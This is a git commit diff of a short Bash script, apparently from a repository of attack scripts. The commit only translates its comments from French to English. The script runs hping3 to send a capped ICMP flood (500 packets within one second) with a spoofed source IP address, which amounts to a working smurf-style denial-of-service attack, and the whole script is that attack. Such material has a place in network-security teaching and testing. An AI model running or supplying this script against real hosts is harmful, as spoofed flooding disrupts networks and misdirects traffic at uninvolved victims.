79625faf20704ce419a4beb6c7b7450eedab50dd
guilhemvnt <91870149+Guilhemvnt@users.noreply.github.com>
2024-03-24 20:56:59 +0100

    Update smurfAtk.sh

--- Atks/smurfAtk.sh
+++ Atks/smurfAtk.sh
@@ -1,15 +1,15 @@
 #!/bin/bash
 
-# Vérifier le nombre d'arguments
+# check nb arguments
 if [ "$#" -ne 2 ]; then
     echo "Usage: $0 <source_ip> <destination_ip>"
     exit 1
 fi
 
-# Récupérer les adresses IP à partir des arguments
+# get ip from arguments
 source_ip="$1"
 destination_ip="$2"
 
-# Limiter le nombre de paquets à 500 et arrêter après une seconde
+# set a limits to nb packets send
 packet_count=500
 timeout 1 hping3 -1 --flood -c "$packet_count" -a "$source_ip" "$destination_ip"
